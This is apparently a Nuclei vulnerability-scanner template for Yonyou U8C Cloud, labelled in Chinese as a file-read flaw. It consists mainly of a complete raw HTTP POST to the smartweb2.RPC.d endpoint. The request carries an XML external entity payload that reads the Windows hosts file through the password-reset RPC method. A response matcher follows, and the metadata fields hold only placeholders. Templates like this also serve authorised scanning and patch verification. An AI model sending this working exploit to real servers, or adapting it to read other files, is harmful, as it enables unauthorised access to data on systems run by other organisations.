id: yonyou-U8C-Cloud-smartweb2-rpc-lfi
info:
  name: 用友-U8C-Cloud-smartweb2-rpc-文件读取
  author: apple
  severity: medium
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 258

        __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://Windows/System32/drivers/etc/hosts" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
    matchers:
      - type: word
        part: body
        words:
          - 'Copyright'
